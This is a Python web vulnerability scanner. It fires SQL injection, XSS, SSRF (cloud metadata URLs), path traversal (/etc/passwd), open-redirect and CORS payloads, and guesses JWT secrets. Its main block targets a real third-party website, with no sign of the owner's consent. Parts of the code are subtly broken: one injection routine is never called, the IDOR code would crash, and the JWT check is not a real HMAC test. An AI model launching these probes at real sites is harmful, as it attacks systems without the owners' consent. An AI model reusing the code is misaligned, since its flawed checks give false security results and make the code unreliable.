

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import sys
import time
import json
import base64
import hashlib
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed

class WebPentestScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            'csrf': [],
            'sqli': [],
            'xss': [],
            'idor': [],
            'ssrf': [],
            'lfi': [],
            'xxe': [],
            'open_redirect': [],
            'jwt': [],
            'cors': [],
            'headers': [],
            'cookies': [],
            'subdomains': [],
            'dirs': []
        }
        self.visited = set()
        self.forms = []
        self.params = []

    def run(self):
        print(f"\n[+] Starting WebPentestScanner on: {self.target_url}\n")
        
     
        self._enum_subdomains()
        
   
        self._fuzz_directories()
        
 
        self._check_headers_cookies()
        

        self._crawl_and_scan()
        
  
        self._scan_params()
        
    
        self._test_ssrf_lfi()
        
       
        self._test_open_redirect()
        
     
        self._check_cors()
        

        self._check_jwt()
        
        self._print_report()


    def _enum_subdomains(self):
        print("[*] Enumerating subdomains...")
        domain = urlparse(self.target_url).netloc
        common_subdomains = ['www', 'mail', 'ftp', 'admin', 'dev', 'test', 'api', 'secure']
        for sub in common_subdomains:
            subdomain = f"{sub}.{domain}"
            try:
                dns.resolver.resolve(subdomain, 'A')
                self.results['subdomains'].append(subdomain)
                print(f"    [+] Found: {subdomain}")
            except:
                pass

    def _fuzz_directories(self):
        print("[*] Directory fuzzing...")
        common_dirs = ['admin', 'login', 'api', 'backup', 'config', 'uploads', 'css', 'js', 'images']
        for dir_name in common_dirs:
            url = urljoin(self.target_url, dir_name + '/')
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code != 404:
                    self.results['dirs'].append(url)
                    print(f"    [+] Found: {url}")
            except:
                pass


    def _check_headers_cookies(self):
        print("[*] Checking security headers and cookies...")
        try:
            resp = self.session.get(self.target_url, timeout=10)
            headers = resp.headers
            sec_headers = {
                'Strict-Transport-Security': 'HSTS header missing',
                'Content-Security-Policy': 'CSP header missing',
                'X-Frame-Options': 'X-Frame-Options missing',
                'X-Content-Type-Options': 'X-Content-Type-Options missing',
                'Referrer-Policy': 'Referrer-Policy missing'
            }
            for hdr, msg in sec_headers.items():
                if hdr not in headers:
                    self.results['headers'].append(f"{hdr}: {msg}")
                    print(f"    [!] {msg}")

            cookies = resp.cookies
            for cookie in cookies:
                if not cookie.secure:
                    self.results['cookies'].append(f"Cookie '{cookie.name}' missing Secure flag")
                    print(f"    [!] Cookie '{cookie.name}' missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    set_cookie = headers.get('Set-Cookie', '')
                    if cookie.name in set_cookie and 'HttpOnly' not in set_cookie:
                        self.results['cookies'].append(f"Cookie '{cookie.name}' missing HttpOnly flag")
                        print(f"    [!] Cookie '{cookie.name}' missing HttpOnly flag")
        except Exception as e:
            print(f"    [!] Header check error: {e}")


    def _crawl_and_scan(self):
        print("[*] Crawling and scanning forms...")
        urls = [self.target_url]
        while urls and len(self.visited) < 10:
            url = urls.pop()
            if url in self.visited:
                continue
            self.visited.add(url)
            try:
                resp = self.session.get(url, timeout=10)
                if resp.status_code != 200:
                    continue
                soup = BeautifulSoup(resp.text, 'html.parser')
 
                for form in soup.find_all('form'):
                    self._scan_form(form, url)
        
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    if full_url.startswith(self.target_url) and full_url not in self.visited:
                        urls.append(full_url)
    
                parsed = urlparse(url)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    for key, vals in params.items():
                        for val in vals:
                            self.params.append((url, key, val))
            except Exception as e:
                print(f"    [!] Crawl error: {e}")

    def _scan_form(self, form, page_url):
        action = form.get('action')
        method = form.get('method', 'GET').upper()
        form_url = urljoin(page_url, action) if action else page_url
        inputs = form.find_all('input')
        data = {}
        token_fields = []
        for inp in inputs:
            name = inp.get('name')
            value = inp.get('value', 'test')
            if name:
                data[name] = value
                if 'csrf' in name.lower() or 'token' in name.lower() or 'authenticity' in name.lower():
                    token_fields.append(name)
     
        self._test_csrf(form_url, method, data, token_fields)

        if data:
            self.forms.append((form_url, method, data))


    def _test_csrf(self, url, method, data, token_fields):
        try:

            if method == 'POST':
                resp1 = self.session.post(url, data=data, timeout=10, allow_redirects=False)
            else:
                resp1 = self.session.get(url, params=data, timeout=10, allow_redirects=False)
            baseline_status = resp1.status_code

            forged_data = {k:v for k,v in data.items() if k not in token_fields}
            if not forged_data:
                forged_data = {}
            if method == 'POST':
                resp2 = self.session.post(url, data=forged_data, timeout=10, allow_redirects=False)
            else:
                resp2 = self.session.get(url, params=forged_data, timeout=10, allow_redirects=False)
            if resp2.status_code == baseline_status or resp2.status_code < 400:
                self.results['csrf'].append({
                    'url': url,
                    'reason': 'Token removed, request accepted'
                })
                print(f"    [!] CSRF VULN: {url}")
        except:
            pass


    def _scan_form_injections(self):
        print("[*] Testing form injections (SQLi, XSS)...")
        for form_url, method, data in self.forms:
            for key, value in data.items():
         
                sqli_payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "1 AND 1=1", "1 AND 1=2"]
                for payload in sqli_payloads:
                    test_data = data.copy()
                    test_data[key] = value + payload
                    try:
                        if method == 'POST':
                            resp = self.session.post(form_url, data=test_data, timeout=10)
                        else:
                            resp = self.session.get(form_url, params=test_data, timeout=10)
                        if re.search(r'(sql|database|mysql|syntax|error|warning|exception|odbc)', resp.text, re.I):
                            self.results['sqli'].append({
                                'url': form_url,
                                'param': key,
                                'payload': payload
                            })
                            print(f"    [!] SQLi found: {form_url}?{key}={test_data[key]}")
                            break
                    except:
                        pass

                xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
                for payload in xss_payloads:
                    test_data = data.copy()
                    test_data[key] = value + payload
                    try:
                        if method == 'POST':
                            resp = self.session.post(form_url, data=test_data, timeout=10)
                        else:
                            resp = self.session.get(form_url, params=test_data, timeout=10)
                        if payload in resp.text:
                            self.results['xss'].append({
                                'url': form_url,
                                'param': key,
                                'payload': payload
                            })
                            print(f"    [!] XSS found: {form_url}?{key}={test_data[key]}")
                            break
                    except:
                        pass


    def _scan_params(self):
        print("[*] Scanning GET parameters...")
        for url, key, val in self.params:
          
            if val.isdigit():
                test_val = str(int(val) + 1)
                test_params = {key: test_val}
                new_url = url.replace(parse_qs(urlparse(url).query), urlencode(test_params))
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if resp.status_code == 200:
                        orig_resp = self.session.get(url, timeout=10)
                        if resp.text != orig_resp.text:
                            self.results['idor'].append({
                                'url': new_url,
                                'param': key,
                                'new_val': test_val
                            })
                            print(f"    [!] IDOR possible: {new_url}")
                except:
                    pass
          
            for payload in ["'", "' OR '1'='1"]:
                test_params = parse_qs(urlparse(url).query)
                test_params[key] = [val + payload]
                new_query = urlencode(test_params, doseq=True)
                new_url = url.replace(urlparse(url).query, new_query)
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if re.search(r'(sql|database|mysql|syntax|error|warning|exception|odbc)', resp.text, re.I):
                        self.results['sqli'].append({
                            'url': new_url,
                            'param': key,
                            'payload': payload
                        })
                        print(f"    [!] SQLi found: {new_url}")
                except:
                    pass
     
            for payload in ["<script>alert(1)</script>"]:
                test_params = parse_qs(urlparse(url).query)
                test_params[key] = [val + payload]
                new_query = urlencode(test_params, doseq=True)
                new_url = url.replace(urlparse(url).query, new_query)
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if payload in resp.text:
                        self.results['xss'].append({
                            'url': new_url,
                            'param': key,
                            'payload': payload
                        })
                        print(f"    [!] XSS found: {new_url}")
                except:
                    pass


    def _test_ssrf_lfi(self):
        print("[*] Testing SSRF & LFI...")
        for url, key, val in self.params:
     
            ssrf_payloads = [
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/',
                'http://127.0.0.1/',
                'http://localhost/'
            ]
            for payload in ssrf_payloads:
                test_params = parse_qs(urlparse(url).query)
                test_params[key] = [payload]
                new_query = urlencode(test_params, doseq=True)
                new_url = url.replace(urlparse(url).query, new_query)
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if 'aws' in resp.text.lower() or 'metadata' in resp.text.lower() or 'root' in resp.text.lower():
                        self.results['ssrf'].append({
                            'url': new_url,
                            'param': key,
                            'payload': payload
                        })
                        print(f"    [!] SSRF possible: {new_url}")
                        break
                except:
                    pass
        
            lfi_payloads = ['../../../../etc/passwd', '..\\..\\..\\..\\windows\\win.ini']
            for payload in lfi_payloads:
                test_params = parse_qs(urlparse(url).query)
                test_params[key] = [payload]
                new_query = urlencode(test_params, doseq=True)
                new_url = url.replace(urlparse(url).query, new_query)
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if 'root:' in resp.text or 'For more information' in resp.text:
                        self.results['lfi'].append({
                            'url': new_url,
                            'param': key,
                            'payload': payload
                        })
                        print(f"    [!] LFI possible: {new_url}")
                        break
                except:
                    pass


    def _test_open_redirect(self):
        print("[*] Testing open redirect...")
        for url, key, val in self.params:
            payload = 'https://evil.com'
            test_params = parse_qs(urlparse(url).query)
            test_params[key] = [payload]
            new_query = urlencode(test_params, doseq=True)
            new_url = url.replace(urlparse(url).query, new_query)
            try:
                resp = self.session.get(new_url, timeout=10, allow_redirects=False)
                if resp.status_code in [301, 302, 303, 307, 308] and 'evil.com' in resp.headers.get('Location', ''):
                    self.results['open_redirect'].append({
                        'url': new_url,
                        'param': key,
                        'payload': payload
                    })
                    print(f"    [!] Open redirect: {new_url}")
            except:
                pass


    def _check_cors(self):
        print("[*] Checking CORS...")
        try:
            origin = 'https://evil.com'
            resp = self.session.get(self.target_url, headers={'Origin': origin}, timeout=10)
            if resp.headers.get('Access-Control-Allow-Origin') == origin:
                self.results['cors'].append(f"CORS allows arbitrary origin: {origin}")
                print(f"    [!] CORS misconfiguration: allows {origin}")
        except:
            pass


    def _check_jwt(self):
        print("[*] Checking JWT weaknesses...")

        try:
            resp = self.session.get(self.target_url, timeout=10)
         
            for cookie in resp.cookies:
                if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                    self._test_jwt_token(cookie.value)
       
            if 'Authorization' in resp.request.headers:
                auth = resp.request.headers['Authorization']
                if auth.startswith('Bearer '):
                    token = auth.split(' ')[1]
                    self._test_jwt_token(token)
        except:
            pass

    def _test_jwt_token(self, token):
        parts = token.split('.')
        if len(parts) != 3:
            return
        header, payload, signature = parts

        try:
            decoded_header = base64.urlsafe_b64decode(header + '==')
            if b'"alg":"none"' in decoded_header:
                self.results['jwt'].append('alg=none vulnerability')
                print("    [!] JWT alg=none vulnerability")
        except:
            pass

        common_secrets = ['secret', 'password', '123456', 'jwt', 'secretkey']
        for secret in common_secrets:
            try:
                fake_sig = base64.urlsafe_b64encode(
                    hashlib.sha256((header + '.' + payload).encode() + secret.encode()).digest()
                ).decode().rstrip('=')
                if fake_sig == signature:
                    self.results['jwt'].append(f'Weak secret found: {secret}')
                    print(f"    [!] JWT weak secret: {secret}")
                    break
            except:
                pass


    def _print_report(self):
        print("\n" + "="*60)
        print("SCAN COMPLETE - FINAL REPORT")
        print("="*60)
        total = 0
        for vuln_type, findings in self.results.items():
            if findings:
                print(f"\n[!] {vuln_type.upper()} - {len(findings)} finding(s):")
                for f in findings:
                    if isinstance(f, dict):
                        for k, v in f.items():
                            print(f"      {k}: {v}")
                        print("    ---")
                    else:
                        print(f"      {f}")
                total += len(findings)
            else:
                print(f"\n[✓] {vuln_type.upper()} - No issues found.")
        print("\n" + "="*60)
        if total == 0:
            print("[✓] No vulnerabilities automatically detected.")
        else:
            print(f"[!] Total potential issues: {total}")
        print("[i] Manual verification is always recommended.")
        print("="*60)


if __name__ == "__main__":
   
    TARGET_URL = "https://byjus.com/"
    
   
    
    scanner = WebPentestScanner(TARGET_URL)
    scanner.run()